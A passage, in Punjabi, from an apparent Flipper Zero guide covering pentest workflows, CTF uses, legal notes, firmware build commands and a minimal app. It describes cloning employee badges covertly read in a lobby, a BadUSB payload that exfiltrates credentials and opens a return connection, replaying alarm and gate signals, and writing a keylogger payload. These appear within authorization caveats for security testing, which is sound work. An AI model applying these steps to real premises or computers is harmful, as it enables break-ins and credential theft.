- ਨੈੱਟਵਰਕ ਦੀ ਟੋਹ ਲਈ Bettercap ਜਾਂ Kismet ਚਲਾਉਣਾ
- ਲਾਲ-ਟੀਮ ਅਭਿਆਸ ਦੌਰਾਨ C2 ਰੀਲੇ ਵਜੋਂ ਕੰਮ ਕਰਨਾ
- microSD ਤੋਂ ਵੱਡੇ ਕੈਪਚਰ ਸੰਭਾਲਣਾ

## ਅਧਿਕਾਰਤ ਦਾਖ਼ਲਾ-ਜਾਂਚ ਕਾਰਜ-ਪ੍ਰਵਾਹ

### ਭੌਤਿਕ ਪਹੁੰਚ ਦੀ ਜਾਂਚ ਦਾ ਕਾਰਜ-ਪ੍ਰਵਾਹ

1. ਲੌਬੀ ਵਿੱਚ ਨੇੜੇ ਤੋਂ ਲੰਘਦੇ ਕਰਮਚਾਰੀਆਂ ਦੇ ਪਹੁੰਚ-ਪਛਾਣ ਪੱਤਰ ਪੜ੍ਹਨ ਲਈ **125 kHz RFID ਪਾਠਕ** ਵਰਤੋ।
2. ਪਛਾਣ ਪੱਤਰ ਨੂੰ ਖਾਲੀ T5577 ਕਾਰਡ ਉੱਤੇ ਨਕਲ ਕਰੋ ਜਾਂ Flipper ਤੋਂ ਸਿੱਧਾ ਉਸਦੀ ਨਕਲ ਚਲਾਓ।
3. ਨਕਲ ਕੀਤੇ ਪਛਾਣ ਪੱਤਰ ਨਾਲ ਸੁਰੱਖਿਅਤ ਖੇਤਰ ਵਿੱਚ ਦਾਖ਼ਲ ਹੋਣ ਦੀ ਜਾਂਚ ਕਰੋ।
4. ਕਿਹੜੇ ਪਾਠਕਾਂ ਨੇ ਨਕਲ ਕੀਤੇ ਪ੍ਰਮਾਣ-ਪੱਤਰ ਨੂੰ ਸਵੀਕਾਰਿਆ, ਇਹ ਦਰਜ ਕਰਕੇ ਗਾਹਕ ਨੂੰ ਰਿਪੋਰਟ ਦਿਓ।



ਇਸ ਨਾਲ ਪਤਾ ਲੱਗਦਾ ਹੈ ਕਿ ਥਾਂ EM4100 (ਅਸੁਰੱਖਿਅਤ ਅਤੇ ਨਕਲਯੋਗ) ਉੱਤੇ ਨਿਰਭਰ ਹੈ ਜਾਂ ਆਧੁਨਿਕ NFC ਸਮਾਰਟ ਕਾਰਡਾਂ ਉੱਤੇ। ਇਹ ਜਾਂਚ ਸਿਰਫ਼ ਲਿਖਤੀ ਇਜਾਜ਼ਤ ਅਤੇ ਤੈਅ ਦਾਇਰੇ ਵਿੱਚ ਕਰੋ।

### ਵਾਇਰਲੈੱਸ ਡਿਵਾਈਸਾਂ ਦੀ ਸੂਚੀ

1. ਮਨਜ਼ੂਰੀ ਨਾਲ **Sub-GHz Frequency Analyzer** (ਸਬ-ਗੀਗਾਹਰਟਜ਼ ਆਵ੍ਰਿਤੀ ਵਿਸ਼ਲੇਸ਼ਕ) ਚਲਾਉਂਦੇ ਹੋਏ ਸਥਾਨ ਦਾ ਸਰਵੇਖਣ ਕਰੋ।
2. ਸਰਗਰਮ ਆਵ੍ਰਿਤੀਆਂ ਅਤੇ ਸੰਕੇਤਾਂ ਦੀਆਂ ਕਿਸਮਾਂ ਲਿਖੋ।
3. **Read** (ਸੰਕੇਤ ਪੜ੍ਹੋ) ਨਾਲ ਬੇਤਾਰ ਅਲਾਰਮ ਸੰਵੇਦਕਾਂ, ਪਾਰਕਿੰਗ ਗੇਟਾਂ ਅਤੇ ਤਾਪਮਾਨ ਤੇ ਹਵਾ-ਨਿਯੰਤਰਣ ਯੰਤਰਾਂ ਦੇ ਸੰਕੇਤ ਪਛਾਣੋ।
4. ਸਥਿਰ-ਕੋਡ ਯੰਤਰਾਂ ਦੀਆਂ ਖਾਮੀਆਂ ਨੂੰ ਉੱਚ ਗੰਭੀਰਤਾ ਵਾਲੇ ਨਤੀਜਿਆਂ ਵਜੋਂ ਦਰਜ ਕਰੋ।

### ਆਰਐਫਆਈਡੀ ਸਰਵੇਖਣ

1. ਪ੍ਰਮਾਣ-ਪੱਤਰ ਨਾਲ ਲਿਜਾਣ ਤੋਂ ਬਿਨਾਂ **NFC > Detect Reader** (ਕਾਰਡ ਵਾਂਗ ਕੰਮ ਕਰਕੇ ਪਾਠਕ ਲੱਭਣ ਵਾਲਾ ਮੀਨੂ) ਚਲਾਓ ਤਾਂ Flipper ਕਾਰਡ ਵਾਂਗ ਵਰਤਾਅ ਕਰਕੇ ਪਾਠਕ ਲੱਭੇ।
2. ਪਾਠਕ Mifare Classic, DESfire ਜਾਂ ISO 15693 ਸਹਾਇਕ ਕਰਦਾ ਹੈ ਜਾਂ ਨਹੀਂ ਵੇਖ ਕੇ ਪਹੁੰਚ ਬਿੰਦੂ ਦੀ ਸੁਰੱਖਿਆ ਅੰਕੋ।

### BadUSB ਜਾਂਚ ਨਕਲ

1. Flipper ਦੇ SD ਕਾਰਡ ਵਿੱਚ ਪਹਿਲਾਂ ਤੋਂ DuckyScript ਪੇਲੋਡ ਰੱਖੋ।
2. Flipper ਨੂੰ ਖੁੱਲ੍ਹੇ ਸੈਸ਼ਨ ਵਾਲੇ ਕੰਪਿਊਟਰ ਨਾਲ ਜੁੜਿਆ ਛੱਡੋ (ਭੌਤਿਕ ਪਹੁੰਚ ਲੋੜੀਂਦੀ ਹੈ)।
3. ਸਕ੍ਰਿਪਟ ਆਪਣੇ ਆਪ ਚੱਲਦੀ ਹੈ: ਨਿਸ਼ਾਨਾ ਕੰਪਿਊਟਰਾਂ ਦੀ ਸੂਚੀ ਬਣਾਉਂਦੀ, ਪ੍ਰਮਾਣ-ਪੱਤਰ ਬਾਹਰ ਭੇਜਦੀ ਅਤੇ ਵਾਪਸੀ-ਸੰਪਰਕ ਸਥਾਪਤ ਕਰਦੀ ਹੈ।
4. ਚੱਲਣ ਦਾ ਸਮਾਂ ਅਤੇ ਪਛਾਣ ਦਰਜ ਕਰੋ।



ਇਸ ਨਾਲ ਸੰਸਥਾ ਦੀ ਯੂਐਸਬੀ ਯੰਤਰ-ਨਿਯੰਤਰਣ ਨੀਤੀ ਅਤੇ ਅੰਤਿਮ-ਬਿੰਦੂ ਪਛਾਣ ਜਾਂਚੀ ਜਾਂਦੀ ਹੈ। ਇਹ ਜਾਂਚ ਸਿਰਫ਼ ਮਨਜ਼ੂਰਸ਼ੁਦਾ ਪ੍ਰਯੋਗਸ਼ਾਲਾ ਦੇ ਕੰਪਿਊਟਰ ਉੱਤੇ ਕਰੋ ਅਤੇ ਪ੍ਰਮਾਣ-ਪੱਤਰ ਇਕੱਠੇ ਨਾ ਕਰੋ।

### ਵਾਇਰਲੈੱਸ ਅਲਾਰਮ ਸੈਂਸਰ ਦੀ ਜਾਂਚ

ਕਈ ਬੇਤਾਰ ਦਰਵਾਜ਼ਿਆਂ ਅਤੇ ਖਿੜਕੀਆਂ ਦੇ ਸੰਵੇਦਕ ਸੌਖੇ ਸਬ-ਗੀਗਾਹਰਟਜ਼ OOK ਸੰਕੇਤ ਭੇਜਦੇ ਹਨ। ਮਨਜ਼ੂਰਸ਼ੁਦਾ ਪ੍ਰਯੋਗਸ਼ਾਲਾ ਵਿੱਚ, ਜੇ ਕੋਡ ਸਥਿਰ ਹੋਵੇ:

1. ਕਾਬੂ ਨਾਲ ਸੈਂਸਰ ਚਾਲੂ ਕਰਕੇ ਸੰਕੇਤ **ਦਰਜ** ਕਰੋ।
2. ਅਸਲ ਸਿਸਟਮ ਦੀ ਥਾਂ ਜਾਂਚ-ਮੇਜ਼ ਉੱਤੇ ਸੰਕੇਤ **ਮੁੜ ਪ੍ਰਸਾਰਿਤ** ਕਰਕੇ ਸੈਂਸਰ ਦੇ ਚਾਲੂ ਹੋਣ ਦੀ ਨਕਲ ਕਰੋ।
3. ਵੇਖੋ ਕਿ ਅਲਾਰਮ ਸਿਸਟਮ ਚੇਤਾਵਨੀ ਦਿੰਦਾ ਹੈ ਜਾਂ ਨਹੀਂ।

ਇਸ ਨਾਲ ਪਤਾ ਲੱਗਦਾ ਹੈ ਕਿ ਬੇਤਾਰ ਹੱਦ-ਸੈਂਸਰ ਨੂੰ ਸੰਕੇਤ ਦੇ ਮੁੜ-ਪ੍ਰਸਾਰਣ ਤੋਂ ਬਚਾਅ ਦੀ ਲੋੜ ਹੈ ਜਾਂ ਨਹੀਂ।

## ਸੀਟੀਐਫ ਅਤੇ ਮੁਕਾਬਲਿਆਂ ਵਿੱਚ ਵਰਤੋਂ

ਭੌਤਿਕ ਸੁਰੱਖਿਆ ਨਾਲ ਸੰਬੰਧਿਤ **Capture the Flag (CTF, ਝੰਡਾ ਫੜੋ)** ਮੁਕਾਬਲਿਆਂ ਵਿੱਚ Flipper Zero ਵਰਤਿਆ ਜਾਂਦਾ ਹੈ। ਆਮ ਚੁਣੌਤੀਆਂ ਇਹ ਹਨ:

- ਝੰਡੇ ਵਾਲਾ ਬੰਦ ਡੱਬਾ ਖੋਲ੍ਹਣ ਲਈ ਪਹੁੰਚ-ਪਛਾਣ ਪੱਤਰ ਦੀ ਨਕਲ ਕਰਨਾ
- ਨਕਲੀ ਦਰਵਾਜ਼ਾ ਖੋਲ੍ਹਣ ਲਈ ਸਬ-ਗੀਗਾਹਰਟਜ਼ ਸੰਕੇਤ ਮੁੜ ਪ੍ਰਸਾਰਿਤ ਕਰਨਾ
- ਲੁਕਿਆ ਸੁਨੇਹਾ ਲੱਭਣ ਲਈ ਇਨਫਰਾਰੈੱਡ ਸੰਕੇਤ ਦਾ ਭੇਦ ਖੋਲ੍ਹਣਾ
- ਕਿਸੇ ਹੋਰ ਵਰਤੋਂਕਾਰ ਵਜੋਂ ਪਛਾਣ ਦੀ ਪੁਸ਼ਟੀ ਕਰਨ ਲਈ NFC ਟੈਗ ਦੀ ਨਕਲ ਕਰਨਾ
- ਨਿਗਰਾਨੀ ਹੇਠ ਕੰਪਿਊਟਰ ਉੱਤੇ ਪੇਲੋਡ ਚਲਾਉਣ ਲਈ BadUSB ਵਰਤਣਾ

Flipper ਦੇ ਲਾਗ-ਰਿਕਾਰਡ ਅਤੇ ਵੱਡੀ SD ਕਾਰਡ ਸਮਰੱਥਾ CTF ਦੌਰਾਨ ਇਕੱਠੇ ਕੀਤੇ ਸੰਕੇਤਾਂ ਨੂੰ ਬਾਅਦ ਦੇ ਵਿਸ਼ਲੇਸ਼ਣ ਲਈ ਸੰਭਾਲਣਾ ਸੌਖਾ ਕਰਦੇ ਹਨ।

## ਰੱਖਿਆਤਮਕ ਵਰਤੋਂ

ਸੁਰੱਖਿਆ ਟੀਮਾਂ ਆਪਣੇ ਵਾਤਾਵਰਣ ਦੀ ਜਾਂਚ ਕਰਨ ਲਈ Flipper Zero ਵਰਤਦੀਆਂ ਹਨ:

- **ਕਾਰਡ ਜਾਂਚ** — ਅਸੁਰੱਖਿਅਤ EM4100 ਜਾਂ Mifare Classic ਸਿਸਟਮ ਲੱਭੋ ਜਿਨ੍ਹਾਂ ਨੂੰ DESfire EV2 ਜਾਂ ਇਸ ਤੋਂ ਉੱਚੇ ਪੱਧਰ 'ਤੇ ਉੱਨਤ ਕਰਨ ਦੀ ਸਿਫ਼ਾਰਸ਼ ਕਰੋ।
- **ਬੇਤਾਰ ਯੰਤਰ ਜਾਂਚ** — ਸਾਰੇ ਸਬ-ਗੀਗਾਹਰਟਜ਼ ਯੰਤਰ ਦੀ ਸੂਚੀ ਬਣਾਓ ਅਤੇ ਸਥਿਰ-ਕੋਡ ਸਿਸਟਮ ਲੱਭੋ।
- **BadUSB ਨੀਤੀ ਜਾਂਚ** — ਵੇਖੋ ਕਿ ਯੂਐਸਬੀ ਐਚਆਈਡੀ ਉੱਤੇ ਰੋਕ ਦੀ ਨੀਤੀ ਠੀਕ ਕੰਮ ਕਰਦੀ ਹੈ ਜਾਂ ਨਹੀਂ
- **ਇਨਫਰਾਰੈੱਡ ਰਿਮੋਟ ਜਾਂਚ** — ਸੰਵੇਦਨਸ਼ੀਲ ਸਾਜ਼ੋ-ਸਾਮਾਨ ਨੂੰ ਸਰਬਵਿਆਪੀ ਇਨਫਰਾਰੈੱਡ ਰਿਮੋਟ ਨਾਲ ਚਲਾਇਆ ਤਾਂ ਨਹੀਂ ਜਾ ਸਕਦਾ, ਜਾਂਚੋ।
- **ਐਨਐਫਸੀ ਟੈਗ ਦੀ ਨਕਲ ਜਾਂਚ** — ਮਨਜ਼ੂਰਸ਼ੁਦਾ ਜਾਂਚ ਵਿੱਚ ਉਤਪਾਦ ਜਾਂ ਪਛਾਣ-ਪੱਤਰ ਦੇ ਐਨਐਫਸੀ ਟੈਗ ਦੀ ਨਕਲ ਸੰਭਵ ਹੈ ਜਾਂ ਨਹੀਂ, ਇਹ ਪਤਾ ਕਰੋ।

## ਕਾਨੂੰਨੀ ਅਤੇ ਨੈਤਿਕ ਗੱਲਾਂ

Flipper Zero ਸੁਰੱਖਿਆ-ਖੋਜ ਲਈ ਜਾਇਜ਼ ਯੰਤਰ ਹੈ, ਪਰ ਇਸਦੀ ਦੁਰਵਰਤੋਂ ਵੀ ਹੋ ਸਕਦੀ ਹੈ। ਕਾਨੂੰਨੀ ਜੋਖ਼ਮ ਸਥਾਨ ਅਤੇ ਹਾਲਾਤਾਂ ਉੱਤੇ ਨਿਰਭਰ ਕਰਦਾ ਹੈ।

### ਮਨਜ਼ੂਰੀ ਨਾਲ ਆਮ ਤੌਰ 'ਤੇ ਕਾਨੂੰਨੀ

- ਆਪਣੇ ਡਿਵਾਈਸਾਂ ਦੀ ਜਾਂਚ
- ਦਸਤਖ਼ਤ ਕੀਤੇ ਬਿਆਨ ਦੇ ਦਾਇਰੇ ਹੇਠ ਮਨਜ਼ੂਰਸ਼ੁਦਾ ਦਾਖ਼ਲਾ-ਜਾਂਚ
- ਕਾਬੂ ਵਾਲੀ ਪ੍ਰਯੋਗਸ਼ਾਲਾ ਵਿੱਚ ਸੁਰੱਖਿਆ ਖੋਜ
- ਆਪਣੇ ਪਹੁੰਚ ਕਾਰਡ ਅਤੇ ਰਿਮੋਟ ਪੜ੍ਹਨਾ
- ਮਨਜ਼ੂਰ ਸੀਟੀਐਫ ਮੁਕਾਬਲੇ ਵਿੱਚ ਹਿੱਸਾ ਲੈਣਾ

### ਆਮ ਤੌਰ 'ਤੇ ਗੈਰਕਾਨੂੰਨੀ

- ਅੰਦਰ ਜਾਣ ਲਈ ਕਿਸੇ ਹੋਰ ਦੇ ਗੈਰਾਜ ਦਰਵਾਜ਼ੇ ਦਾ ਸੰਕੇਤ ਮੁੜ ਪ੍ਰਸਾਰਿਤ ਕਰਨਾ
- ਬਿਨਾਂ ਅਧਿਕਾਰ ਇਮਾਰਤ ਵਿੱਚ ਜਾਣ ਲਈ ਪਹੁੰਚ ਕਾਰਡ ਦੀ ਨਕਲ ਕਰਨਾ
- ਆਪਣੇ ਕਾਬੂ ਤੋਂ ਬਾਹਰ ਦੇ ਨੈੱਟਵਰਕ ਉੱਤੇ ਪ੍ਰਮਾਣੀਕਰਨ-ਸਮਾਪਤੀ ਫਰੇਮ ਭੇਜਣਾ
- ਲਿਖਤੀ ਇਜਾਜ਼ਤ ਤੋਂ ਬਿਨਾਂ ਕੰਪਿਊਟਰ ਉੱਤੇ BadUSB ਵਰਤਣਾ
- ਬਹੁਤੇ ਇਲਾਕਿਆਂ ਵਿੱਚ ਨਿੱਜੀ ਸੰਚਾਰ ਨੂੰ ਚੁੱਪਕੇ ਸੁਣਨਾ (ਸਬ-ਗੀਗਾਹਰਟਜ਼ ਜਾਂ ਹੋਰ ਮਾਧਿਅਮ ਰਾਹੀਂ)

**ਸੰਯੁਕਤ ਰਾਜ ਵਿੱਚ**, Computer Fraud and Abuse Act (CFAA), Electronic Communications Privacy Act (ECPA) ਅਤੇ Federal Communications Commission (FCC) ਦੇ ਰੇਡੀਓ-ਆਵ੍ਰਿਤੀ ਪ੍ਰਸਾਰਣ ਨਿਯਮ ਲਾਗੂ ਹਨ। **EU ਵਿੱਚ**, ਰਾਸ਼ਟਰੀ ਕੰਪਿਊਟਰ-ਅਪਰਾਧ ਕਾਨੂੰਨ ਅਤੇ ਰੇਡੀਓ ਉਪਕਰਣ ਨਿਰਦੇਸ਼ ਇਸੇ ਤਰ੍ਹਾਂ ਦੀ ਸੁਰੱਖਿਆ ਦਿੰਦੇ ਹਨ।

*FCC ਸਬ-ਗੀਗਾਹਰਟਜ਼ ਸੰਕੇਤ ਲੈ ਸਕਣ ਵਾਲਾ ਯੰਤਰ ਰੱਖਣ ਜਾਂ ਵਰਤਣ ਤੋਂ ਨਹੀਂ ਰੋਕਦਾ। ਕੁਝ ਆਵ੍ਰਿਤੀਆਂ ਉੱਤੇ ਬਿਨਾਂ ਇਜਾਜ਼ਤ ਪ੍ਰਸਾਰਣ ਕਰਨਾ ਮਨਾਹੀ ਹੈ। ਬਹੁਤੇ ਖਪਤਕਾਰ ਯੰਤਰ ਬਿਨਾਂ ਲਾਇਸੈਂਸ ਵਾਲੇ ਆਈਐਸਐਮ ਬੈਂਡ (315 ਮੇਗਾਹਰਟਜ਼, 433 ਮੇਗਾਹਰਟਜ਼, 915 ਮੇਗਾਹਰਟਜ਼) ਵਰਤਦੇ ਹਨ ਅਤੇ ਘੱਟ ਸ਼ਕਤੀ ਕਾਰਨ ਆਮ ਤੌਰ 'ਤੇ Part 15 ਦੀ ਹੱਦ ਵਿੱਚ ਰਹਿੰਦੇ ਹਨ.*

ਕਾਰ ਚੋਰੀ ਦੀ ਚਿੰਤਾ ਕਰਕੇ ਕੈਨੇਡਾ ਨੇ 2024 ਵਿੱਚ Flipper Zero ਦੀ ਦਰਾਮਦ ਰੋਕਣ ਦੀ ਕੋਸ਼ਿਸ਼ ਕੀਤੀ ਸੀ। ਖ਼ਬਰਾਂ ਦੀ ਕਵਰੇਜ ਤੋਂ ਬਾਅਦ ਇਹ ਮੁੱਖ ਤੌਰ 'ਤੇ ਸਿਆਸੀ ਪ੍ਰਤੀਕਿਰਿਆ ਸੀ, ਕੋਈ ਸਹੀ ਤਕਨੀਕੀ ਚਿੰਤਾ ਨਹੀਂ: ਆਧੁਨਿਕ ਕਾਰਾਂ ਦੀ ਚਾਬੀ-ਰਹਿਤ ਦਾਖ਼ਲਾ ਪ੍ਰਣਾਲੀ ਬਦਲਦੇ ਕੋਡ ਵਰਤਦੀ ਹੈ, ਜਿਨ੍ਹਾਂ ਨੂੰ ਵਾਧੂ ਹਾਰਡਵੇਅਰ ਤੋਂ ਬਿਨਾਂ Flipper ਨਹੀਂ ਤੋੜ ਸਕਦਾ।

## ਵਿਕਾਸ ਵਾਤਾਵਰਣ ਬਣਾਉਣਾ

### ਅਧਿਕਾਰਤ ਫਰਮਵੇਅਰ ਬਣਾਉਣਾ ਕਰਨਾ

```bash
git clone --recursive https://github.com/flipperdevices/flipperzero-firmware.git
cd flipperzero-firmware

# ਟੂਲਚੇਨ ਇੰਸਟਾਲ ਕਰੋ (Linux/macOS)
./fbt

# ਫਰਮਵੇਅਰ ਬਣਾਓ
./fbt fap_dist

# USB ਰਾਹੀਂ flash ਕਰੋ
./fbt flash_usb_full
```

**FBT (Flipper ਫਰਮਵੇਅਰ ਬਣਾਉਣ ਵਾਲਾ ਸਾਧਨ)** ਆਪਣੇ ਆਪ ਨਿਰਮਾਣ-ਸੰਦਾਂ ਦੀ ਲੜੀ ਤਿਆਰ ਕਰਦਾ, ਨਿਰਭਰਤਾਵਾਂ ਲਿਆਉਂਦਾ ਅਤੇ ਬਣਾਉਣ ਦੀ ਪ੍ਰਕਿਰਿਆ ਸੰਭਾਲਦਾ ਹੈ। Python 3.8+ ਅਤੇ ARM GCC ਕਰਾਸ-ਕੰਪਾਈਲਰ ਲੋੜੀਂਦੇ ਹਨ।

### ਕਸਟਮ ਐਪਲੀਕੇਸ਼ਨ ਲਿਖਣਾ

ਐਪਲੀਕੇਸ਼ਨ **Flipper ਐਪਲੀਕੇਸ਼ਨ ਪੈਕੇਜ (FAP)** ਫਾਰਮੈਟ ਵਰਤਦੀ ਹੈ। ਹਰ ਐਪ `applications_user/` ਜਾਂ `applications/` ਫੋਲਡਰ ਵਿੱਚ ਹੁੰਦੀ ਹੈ।

```c
#include <furi.h>
#include <gui/gui.h>

static void my_app_draw_callback(Canvas* canvas, void* ctx) {
// ਘੱਟੋ-ਘੱਟ FAP; ਮੂਲ ਫੌਂਟ ਸਿਰਫ਼ ASCII ਦਿਖਾਉਂਦਾ ਹੈ, ਇਸ ਲਈ ਸਵਾਗਤ ਅੰਗਰੇਜ਼ੀ ਵਿੱਚ ਰੱਖੋ।
    canvas_draw_str(canvas, 10, 32, "Hello, Flipper!");
}

int32_t my_app_main(void* p) {
    UNUSED(p);
    ViewPort* view_port = view_port_alloc();
    view_port_draw_callback_set(view_port, my_app_draw_callback, NULL);

    Gui* gui = furi_record_open(RECORD_GUI);
    gui_add_view_port(gui, view_port, GuiLayerFullscreen);

    furi_delay_ms(3000);

    gui_remove_view_port(gui, view_port);
    view_port_free(view_port);
    furi_record_close(RECORD_GUI);
    return 0;
}
```

ਐਪਾਂ **Furi (Flipper Universal Registry Implementation)** API ਰਾਹੀਂ Flipper ਦੇ ਹਾਰਡਵੇਅਰ ਤੱਕ ਪਹੁੰਚਦੀਆਂ ਹਨ। ਉਪ-ਪ੍ਰਣਾਲੀ ਤੱਕ ਪਹੁੰਚ ਸੇਵਾ-ਦਾਖ਼ਲਿਆਂ ਉੱਤੇ ਆਧਾਰਿਤ ਹੈ: ਨਾਮ ਨਾਲ ਦਾਖ਼ਲਾ ਖੋਲ੍ਹੋ, ਉਪ-ਪ੍ਰਣਾਲੀ ਦਾ ਹਵਾਲਾ ਲਵੋ, ਉਸਦੀ ਵਰਤੋਂ ਕਰੋ ਅਤੇ ਦਾਖ਼ਲਾ ਬੰਦ ਕਰੋ।

### SD ਕਾਰਡ ਦੇ ਫੋਲਡਰ

Flipper SD ਕਾਰਡ ਉੱਤੇ ਕੁਝ ਨਿਰਧਾਰਤ ਫੋਲਡਰ ਲੱਭਦਾ ਹੈ:

| `subghz/` | ਸੰਭਾਲੇ ਸਬ-ਗੀਗਾਹਰਟਜ਼ ਕੈਪਚਰ (`.sub`) |
| `nfc/` | ਸੰਭਾਲੇ ਐਨਐਫਸੀ ਡੰਪ (`.nfc`) |
| `lfrfid/` | ਸੰਭਾਲੀ LF ਆਰਐਫਆਈਡੀ ਕੁੰਜੀ (`.rfid`) |
| `infrared/` | ਸੰਭਾਲੇ ਇਨਫਰਾਰੈੱਡ ਰਿਮੋਟ (`.ir`) |
| `ibutton/` | ਸੰਭਾਲੀ iButton ਕੁੰਜੀ (`.ibtn`) |
| `badusb/` | DuckyScript ਪੇਲੋਡ (`.txt`) |

Flipper Zero ਤੋਂ ਓਨਾ ਹੀ ਲਾਭ ਮਿਲਦਾ ਹੈ ਜਿੰਨੀ ਡੂੰਘਾਈ ਨਾਲ ਤੁਸੀਂ ਇਸ ਦੀਆਂ ਸਮਰੱਥਾਵਾਂ ਨੂੰ ਸਮਝਦੇ ਹੋ। ਸ਼ੁਰੂਆਤ ਕਰਨਾ ਆਸਾਨ ਹੈ: ਆਪਣਾ ਕਾਰਡ ਪੜ੍ਹੋ, ਰਿਮੋਟ ਤੋਂ ਸੰਕੇਤ ਲਵੋ ਜਾਂ ਜਾਂਚ ਲਈ ਕੀ-ਲੌਗਰ ਪੇਲੋਡ ਲਿਖੋ। ਫਰਮਵੇਅਰ ਦੀ ਅੰਦਰੂਨੀ ਕਾਰਜ-ਵਿਧੀ, GPIO ਵਿਸਥਾਰ ਪ੍ਰਬੰਧ ਅਤੇ ਭਾਈਚਾਰੇ ਦੀ ਐਪ ਸੂਚੀ ਸਮਝਣ ਮਗਰੋਂ ਇਹ ਭੌਤਿਕ ਸੁਰੱਖਿਆ, ਐਮਬੈਡਡ ਸੁਰੱਖਿਆ ਜਾਂ ਬੇਤਾਰ ਖੋਜ ਵਿੱਚ ਲੰਬੇ ਸਮੇਂ ਤੱਕ ਕੰਮ ਆਉਣ ਵਾਲਾ ਯੰਤਰ ਬਣ ਜਾਂਦਾ ਹੈ।

ਆਪਣੇ ਕਾਰਡ ਪੜ੍ਹੋ, ਆਪਣੇ ਸਿਸਟਮ ਜਾਂਚੋ ਅਤੇ ਕਿਸੇ ਹੋਰ ਦੇ ਸਿਸਟਮ ਨੂੰ ਜਾਂਚਣ ਤੋਂ ਪਹਿਲਾਂ ਲਿਖਤੀ ਇਜਾਜ਼ਤ ਲਵੋ।
